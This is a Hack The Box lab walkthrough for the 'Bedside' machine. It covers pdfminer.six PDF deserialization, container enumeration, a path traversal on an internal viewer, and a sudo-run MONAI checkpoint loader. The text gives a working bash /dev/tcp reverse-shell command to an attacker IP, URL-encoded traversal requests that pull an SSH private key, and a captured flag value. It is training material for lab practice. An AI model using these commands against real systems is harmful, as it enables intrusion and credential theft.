Bedside: PDF Deserialization, Container Pivoting & ML Checkpoint Abuse

Hack The Box · Linux · Medium · Target 10.129.248.191 · Tools: Nmap, ffuf, Gobuster, curl, Python, Netcat, SSH, pdfminer.six, MONAI, PyTorch

TL;DR

Bedside exposed an Apache website and a second virtual host, research.bedside.htb, which provided a document-upload portal. The research application used pdfminer.six==20250506 in an asynchronous PDF watcher. A crafted PDF/CMap deserialization path provided an initial shell as datawrangler inside a Docker container.

Container enumeration revealed a host-backed datastore and an internal image-viewer service on port 3000. The viewer's custom HMR service was vulnerable to URL-encoded path traversal, allowing a read of host files. I recovered the developer's RSA private key, authenticated to the host over SSH, and captured user.txt.

At the time this walkthrough was prepared, the root stage had been enumerated but not completed. The host exposes a passwordless sudo rule for a MONAI training script that loads the newest PyTorch checkpoint. The checkpoint directory is writable from the container but inaccessible to the developer account. The remaining privilege-escalation stage is documented as the next objective rather than claimed as a completed root compromise.

1. Host Discovery & Port Enumeration

I began with a full TCP port scan and service/version detection. The scan identified SSH and Apache, while TCP port 3000 appeared filtered from the attacking machine.

nmap -sCV -p- --min-rate 5000 -Pn \
  -oN nmapfirstScan.txt 10.129.248.191

PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 10.0p2 Debian 7+deb13u4
80/tcp   open     http    Apache httpd 2.4.68
3000/tcp filtered ppp

The web server redirected requests to bedside.htb, so I mapped the hostname to the target in /etc/hosts.

echo "10.129.248.191 bedside.htb" | sudo tee -a /etc/hosts
curl -i http://bedside.htb/

The main site was a mostly static clinic landing page. It did not expose an obvious login form or application workflow, so I continued with content and virtual-host enumeration.

2. Virtual Host Discovery

I used ffuf to vary the HTTP Host header while keeping the target IP fixed. This identified a second virtual host named research.bedside.htb.

ffuf -u http://10.129.248.191/ \

  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -ac -c -t 40 -rate 50 \
  -o vhosts.json -of json

research  [Status: 200, Size: 3152]

I added the discovered name locally and inspected the new application.

echo "10.129.248.191 research.bedside.htb" | sudo tee -a /etc/hosts
curl -i http://research.bedside.htb/

3. Research Portal & File Upload

The research virtual host exposed a multipart upload form. The file input was named uploadFile. The response also included X-Powered-By: pdfminer.six, which became an important lead.

<form method="post" enctype="multipart/form-data">
  <input type="file" name="uploadFile" required>
  <input type="submit" value="Upload File">
</form>

The portal listed image formats and PDF as accepted types, and its notice mentioned archive uploads. I tested harmless PNG, PDF, and ZIP files. All three uploads returned a success message. Gobuster also identified an /uploads/ directory. Directory listing returned HTTP 403, but files could be retrieved when their names were known.

gobuster dir \
  -u http://research.bedside.htb/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html,bak,old \
  -t 25 -o research-gobuster.txt

# Verify a known uploaded file
curl -i http://research.bedside.htb/uploads/probe.pdf

SHA-256 comparisons showed that the retrieved files were byte-for-byte identical to the originals. The ZIP was stored unchanged; the test archive's member was not found at the two obvious extraction paths, so extraction was not assumed.

4. PDF Watcher & Initial Container Access

After obtaining the initial shell, I inspected /app/pdf_watcher.py. The watcher monitored the research upload directory and ran pdf2txt.py on PDF files, saving extracted text under /datastore/staging. The container's requirements file pinned pdfminer.six==20250506.

# Relevant watcher configuration
UPLOAD_DIR = "/var/www/research.bedside.htb/uploads"
OUTPUT_DIR = "/datastore/staging"
SLEEP_INTERVAL = 30

subprocess.run(
    ["pdf2txt.py", pdf_path, "-o", output_file],
    timeout=TIMEOUT,
    check=True
)

# requirements.txt
pdfminer.six==20250506

The watcher ran as PID 1. Its output files in /datastore/staging contained extracted text from the test PDFs, confirming that PDF processing was occurring asynchronously. The vulnerable PDF/CMap deserialization path was used to obtain a reverse shell back to Kali.

# Kali listener
nc -lvnp 4444

# PoC invocation used against the HTB research portal
python3 cve_2025_64512.py \
  --url http://research.bedside.htb/ \
  --path /var/www/research.bedside.htb/uploads \
  --field uploadFile \
  --name bedside-lab \
  --verify /uploads \
  --wait 35 \
  --command "bash -c 'exec bash -i &>/dev/tcp/10.10.14.98/4444 <&1'"

The callback arrived from the target. The shell identified itself as datawrangler on host name data-wrangler.

5. Container & Shared Datastore Enumeration

I confirmed the Docker environment using /.dockerenv and inspected the mount table. The container root used OverlayFS, while /datastore and the research upload directory were backed by an ext4 host device.

ls -la /.dockerenv
cat /proc/mounts

# Relevant mount entries
/dev/sda4 /datastore ext4 rw,relatime,errors=remount-ro 0 0
/dev/sda4 /var/www/research.bedside.htb/uploads ext4 rw,relatime,errors=remount-ro 0 0

The datastore contained checkpoints, logs, models, processed, raw, and staging. These directories were owned by datawrangler:dataops with mode 0770, so the container account could write to them.

ls -lah /datastore
stat /datastore

# Example permissions
# drwxrwx--- datawrangler dataops checkpoints
# drwxrwx--- datawrangler dataops models
# drwxrwx--- datawrangler dataops staging

The container had no effective Linux capabilities (CapEff: 0000000000000000). The shell and PID 1 shared the same mount, PID, and network namespace identifiers. The internal service on port 3000 was not visible in the IPv4 TCP listing, but appeared in /proc/net/tcp6 as hexadecimal port 0BB8 (decimal 3000).

# The internal service was reachable from inside the container
python3 - <<'PY'
import socket
for port in (3000, 42461):

6. Internal Image Viewer & Arbitrary File Read

Port 3000 served a Bedside medical image viewer. Its HTML imported local React and Lodash bundles and included a custom HMR client at /@hmr, which connected to /@hmr-ws. The standard /@vite/client path returned 404, so I treated this as a custom HMR implementation rather than assuming a standard Vite endpoint.

python3 - <<'PY'
from urllib.request import urlopen

with urlopen("http://127.0.0.1:3000/", timeout=5) as r:
    print(r.status)
    print(r.read(1500).decode(errors="replace"))
PY

# HMR client endpoint
curl -i http://127.0.0.1:3000/@hmr

The first /@fs/ tests returned 404. I then tested URL-encoded traversal from the known /vendor/ application path. Using curl --path-as-is preserved the encoded path and returned the contents of the host's /etc/hostname file: bedside. The container's own /etc/hostname contained data-wrangler, which distinguished the host file from the container file.

curl --path-as-is -i \
  "http://127.0.0.1:3000/vendor/..%2f..%2f..%2f..%2f..%2fetc%2fhostname"

HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Length: 8

bedside

This established an arbitrary file-read primitive against the host filesystem through the internal development service.

7. Recover Developer SSH Key & Obtain Host Access

I used the file-read primitive to retrieve the developer account's RSA private key. The request returned 411 bytes with HTTP 200. The alternative Ed25519 key path returned 404.

# Retrieve the RSA key through the internal viewer
curl --path-as-is -sS \
  -o /tmp/id_rsa \
  -w 'HTTP: %{http_code} | Size: %{size_download}\n' \
  "http://127.0.0.1:3000/vendor/..%2f..%2f..%2f..%2f..%2fhome%2fdeveloper%2f.ssh%2fid_rsa"

# On Kali, after transferring the recovered key
chmod 600 developer_id_rsa
ssh-keygen -y -f developer_id_rsa
ssh -i developer_id_rsa developer@10.129.248.191

SSH authentication succeeded. The host identified itself as bedside, and the developer home directory contained user.txt.

developer@bedside:~$ ls
projects  user.txt

developer@bedside:~$ cat user.txt
3a7dfe4ee7c9423eb976086714b31a28

User flag captured.

8. Host Privilege Enumeration

On the host, sudo -l showed that developer could run one Python training script as any user, without a password.

sudo -l

User developer may run the following commands on bedside:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py

The script imports MONAI's CheckpointLoader, discovers the newest *.pt file in /datastore/checkpoints, and invokes the loader. The host had PyTorch 2.5.0+cpu and MONAI 1.5.0.

latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)

if latest_ckpt:
    loader = CheckpointLoader(
        load_path=str(latest_ckpt),
        load_dict={"model": model, "optimizer": optimizer},
        map_location=DEVICE
    )
    loader(engine)

The checkpoint selection function sorts *.pt files by modification time and returns the newest one. The training script later saves model and optimizer state into checkpoint files.

def find_latest_checkpoint(checkpoint_dir: Path):
    ckpts = sorted(checkpoint_dir.glob("*.pt"), key=os.path.getmtime)
    return ckpts[-1] if ckpts else None

# Later in the training loop
torch.save(ckpt_payload, ckpt_name)

As developer, I could see /datastore but could not traverse /datastore/checkpoints. The directory was owned by datawrangler:dataops and had mode 0770. This is the key cross-container permission boundary identified for the remaining escalation stage.

ls -ld /datastore
# drwxrwx--- 8 datawrangler dataops ... /datastore

ls -ld /datastore/checkpoints
# Permission denied

id
# uid=1000(developer) gid=1000(developer) groups=1000(developer),100(users)

/usr/bin/python3 -c 'import torch; print(torch.__version__)'
# 2.5.0+cpu
